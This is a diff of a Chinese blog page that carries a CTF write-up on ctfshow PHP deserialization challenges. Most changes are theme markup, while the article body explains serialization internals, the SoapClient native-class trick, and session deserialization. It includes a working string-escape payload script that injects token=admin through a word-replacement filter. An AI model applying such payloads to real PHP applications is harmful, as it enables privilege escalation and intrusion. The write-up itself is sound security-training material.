@@ -1,160 +1,153 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ctfshow-反序列化 | golden的部落阁</title><meta name="author" content="g01den"><meta name="copyright" content="g01den"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="# 一些基础：  private 变量会被序列化为：\x00 类名 \x00 变量名  protected 变量会被序列化为: \x00*\x00 变量名  public 变量会被序列化为：变量名 __sleep ()    &#x2F;&#x2F; 在对象被序列化之前运行  * __wakeup ()   &#x2F;&#x2F; 将在反序列化之后立即调用（当反序列化时变量个数与实际不符是会绕过）  *  如果类中同时定义了 __un">
-<meta property="og:type" content="article">
-<meta property="og:title" content="ctfshow-反序列化">
-<meta property="og:url" content="http://blog.g01den.top/posts/4fb535d6.html">
-<meta property="og:site_name" content="golden的部落阁">
-<meta property="og:description" content="# 一些基础：  private 变量会被序列化为：\x00 类名 \x00 变量名  protected 变量会被序列化为: \x00*\x00 变量名  public 变量会被序列化为：变量名 __sleep ()    &#x2F;&#x2F; 在对象被序列化之前运行  * __wakeup ()   &#x2F;&#x2F; 将在反序列化之后立即调用（当反序列化时变量个数与实际不符是会绕过）  *  如果类中同时定义了 __un">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2024/09/17/789OUwJtAWrNgCo.jpg">
-<meta property="article:published_time" content="2024-09-17T12:19:47.000Z">
-<meta property="article:modified_time" content="2024-09-26T07:18:42.953Z">
-<meta property="article:author" content="g01den">
-<meta property="article:tag" content="Web">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.loli.net/2024/09/17/789OUwJtAWrNgCo.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://blog.g01den.top/posts/4fb535d6.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
-    buttonText: '加载更多'
-  },
-  isPhotoFigcaption: false,
-  islazyload: true,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'ctfshow-反序列化',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: true,
-  postUpdate: '2024-09-26 15:18:42'
-}</script><script>(win=>{
-      win.saveToLocal = {
-        set: (key, value, ttl) => {
-          if (ttl === 0) return
-          const now = Date.now()
-          const expiry = now + ttl * 86400000
-          const item = {
-            value,
-            expiry
-          }
-          localStorage.setItem(key, JSON.stringify(item))
-        },
-      
-        get: key => {
-          const itemStr = localStorage.getItem(key)
-      
-          if (!itemStr) {
-            return undefined
-          }
-          const item = JSON.parse(itemStr)
-          const now = Date.now()
-      
-          if (now > item.expiry) {
-            localStorage.removeItem(key)
-            return undefined
-          }
-          return item.value
-        }
-      }
-    
-      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        script.onerror = reject
-        script.onload = script.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          script.onload = script.onreadystatechange = null
-          resolve()
-        }
 
-        Object.keys(attr).forEach(key => {
-          script.setAttribute(key, attr[key])
-        })
 
-        document.head.appendChild(script)
-      })
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta name="referrer" content="no-referrer"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
+<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="Web" />
+
+
+<link rel="canonical" href="http://blog.g01den.top/posts/4fb535d6.html">
+
+
+
+  <title>
+ctfshow-反序列化 - Web狗的自我安慰 |
+golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
+<meta name="generator" content="Hexo 7.2.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">ctfshow-反序列化
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2024-09-17 20:19:47">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-09-17T20:19:47+08:00">2024-09-17</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="https://s2.loli.net/2024/09/17/789OUwJtAWrNgCo.jpg">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
     
-      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onerror = reject
-        link.onload = link.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          link.onload = link.onreadystatechange = null
-          resolve()
-        }
-        document.head.appendChild(link)
-      })
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Web/" itemprop="item" rel="index" title="分类于 Web狗的自我安慰"><span itemprop="name">Web狗的自我安慰</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/4fb535d6.html">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="g01den">
+    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="golden的部落阁">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
     
-      win.activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
-    
-        if (t === 'dark') activateDarkMode()
-        else if (t === 'light') activateLightMode()
-      
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
-    
-      const detectApple = () => {
-        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-          document.documentElement.classList.add('apple')
-        }
-      }
-      detectApple()
-    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="golden的部落阁" type="application/atom+xml">
-</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://thirdqq.qlogo.cn/headimg_dl?dst_uin=2082045221&amp;spec=640&amp;img_type=jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/bangumis/index.html"><i class="fa-fw fas fa-heart"></i><span> 追番</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 我的朋友们</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/09/17/789OUwJtAWrNgCo.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="golden的部落阁"><span class="site-name">golden的部落阁</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/bangumis/index.html"><i class="fa-fw fas fa-heart"></i><span> 追番</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 我的朋友们</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctfshow-反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-17T12:19:47.000Z" title="发表于 2024-09-17 20:19:47">2024-09-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-26T07:18:42.953Z" title="更新于 2024-09-26 15:18:42">2024-09-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/">Web狗的自我安慰</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ctfshow-反序列化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一些基础"><a class="markdownIt-Anchor" href="#一些基础">#</a> 一些基础：</h1>
+
+    <h1 id="一些基础"><a class="markdownIt-Anchor" href="#一些基础">#</a> 一些基础：</h1>
 <blockquote>
 <p>private 变量会被序列化为：\x00 类名 \x00 变量名<br>
  protected 变量会被序列化为: \x00*\x00 变量名<br>
@@ -201,7 +194,7 @@ __invoke () // 当尝试以调用函数的方式调用一个对象时</p>
 <p>​		这个题给的信息好少，不会做，看下 wp。</p>
 <p>​		这一题主要考察了原生类的反序列化，好吧，第一次遇到完全想不到，即使学了原生类也没想到。</p>
 <p>​		由于整个 index 里面没有任何类，所以后面的反序列化加上 $vip-&gt;getFlag (); 给人第一反应应该是调用了一个不存在的方法以及原生类结合，触发 <code>__call</code>  魔术方法，</p>
-<p>​		贴一个链接，这个文章感觉很详细：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Yuppie001/article/details/139865505?ops_request_misc=%257B%2522request%255Fid%2522%253A%25228FF6B40B-2BC1-4201-8718-1D23181A0D64%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=8FF6B40B-2BC1-4201-8718-1D23181A0D64&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-139865505-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=SoapClient%E5%8E%9F%E7%94%9F%E7%B1%BB&amp;spm=1018.2226.3001.4187">【靶场】ctfshow 详解 web259 原生类反序列化</a></p>
+<p>​		贴一个链接，这个文章感觉很详细：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1cHBpZTAwMS9hcnRpY2xlL2RldGFpbHMvMTM5ODY1NTA1P29wc19yZXF1ZXN0X21pc2M9JTI1N0IlMjUyMnJlcXVlc3QlMjU1RmlkJTI1MjIlMjUzQSUyNTIyOEZGNkI0MEItMkJDMS00MjAxLTg3MTgtMUQyMzE4MUEwRDY0JTI1MjIlMjUyQyUyNTIyc2NtJTI1MjIlMjUzQSUyNTIyMjAxNDA3MTMuMTMwMTAyMzM0Li4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPThGRjZCNDBCLTJCQzEtNDIwMS04NzE4LTFEMjMxODFBMEQ2NCZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfnNvYmFpZHVlbmR+ZGVmYXVsdC0yLTEzOTg2NTUwNS1udWxsLW51bGwuMTQyJTVFdjEwMCU1RXBjX3NlYXJjaF9yZXN1bHRfYmFzZTYmYW1wO3V0bV90ZXJtPVNvYXBDbGllbnQlRTUlOEUlOUYlRTclOTQlOUYlRTclQjElQkImYW1wO3NwbT0xMDE4LjIyMjYuMzAwMS40MTg3">【靶场】ctfshow 详解 web259 原生类反序列化</span></p>
 <p>​		这里是使用的 Soapclient 原生类：</p>
 <blockquote>
 <p><strong>Soapclient 原生类主要作用是使 PHP 应用程序能够方便地调用远程的 SOAP 服务</strong></p>
@@ -242,7 +235,7 @@ __invoke () // 当尝试以调用函数的方式调用一个对象时</p>
 <p>​		<strong>字符串逃逸:</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$m</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$t</span> = <span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line"><span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$umsg</span> ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#palyoad:f=1&amp;m=1&amp;t=1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
 <h1 id="web263"><a class="markdownIt-Anchor" href="#web263">#</a> web263:</h1>
-<p>​		一上来是个登录框，听说考点是 session 反序列化，先贴一个文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/GTL-JU/p/16859098.html">session 反序列化</a></p>
+<p>​		一上来是个登录框，听说考点是 session 反序列化，先贴一个文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vR1RMLUpVL3AvMTY4NTkwOTguaHRtbA==">session 反序列化</span></p>
 <p>​		首先，访问 www.zip 获取源码。</p>
 <p>​		index.php：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-03 16:28:37</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-06 19:21:45</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	session_start();</span><br><span class="line">	//超过5次禁止登陆</span><br><span class="line">	if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">		$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		 setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));</span><br><span class="line">		 $_SESSION[&#x27;limit&#x27;]= 1;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">	&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">	&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1,maximum-scale=1, minimum-scale=1&quot;&gt;</span><br><span class="line">	&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">	&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;</span><br><span class="line">	&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt;</span><br><span class="line">	&lt;title&gt;ctfshow登陆&lt;/title&gt;</span><br><span class="line">	&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">	&lt;div class=&quot;pc-kk-form&quot;&gt;</span><br><span class="line">		&lt;center&gt;&lt;h1&gt;CTFshow 登陆&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">		&lt;form action=&quot;&quot; onsubmit=&quot;return false;&quot;&gt;</span><br><span class="line">			&lt;div class=&quot;pc-kk-form-list&quot;&gt;</span><br><span class="line">				&lt;input id=&quot;u&quot; type=&quot;text&quot; placeholder=&quot;用户名&quot;&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">			&lt;div class=&quot;pc-kk-form-list&quot;&gt;</span><br><span class="line">				&lt;input id=&quot;pass&quot; type=&quot;password&quot; placeholder=&quot;密码&quot;&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">			</span><br><span class="line">			&lt;div class=&quot;pc-kk-form-btn&quot;&gt;</span><br><span class="line">				&lt;button onclick=&quot;check();&quot;&gt;登陆&lt;/button&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">	&lt;script&gt;</span><br><span class="line"></span><br><span class="line">		function check()&#123;</span><br><span class="line">			$.ajax(&#123;</span><br><span class="line">			url:&#x27;check.php&#x27;,</span><br><span class="line">			type: &#x27;GET&#x27;,</span><br><span class="line">			data:&#123;</span><br><span class="line">				&#x27;u&#x27;:$(&#x27;#u&#x27;).val(),</span><br><span class="line">				&#x27;pass&#x27;:$(&#x27;#pass&#x27;).val()</span><br><span class="line">			&#125;,</span><br><span class="line">			success:function(data)&#123;</span><br><span class="line">				alert(JSON.parse(data).msg);</span><br><span class="line">			&#125;,</span><br><span class="line">			error:function(data)&#123;</span><br><span class="line">				alert(JSON.parse(data).msg);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -303,18 +296,18 @@ __invoke () // 当尝试以调用函数的方式调用一个对象时</p>
 <h1 id="web270"><a class="markdownIt-Anchor" href="#web270">#</a> web270：</h1>
 <p>​		268 题的 poc 依旧能用，直接用。</p>
 <h1 id="web271"><a class="markdownIt-Anchor" href="#web271">#</a> web271：</h1>
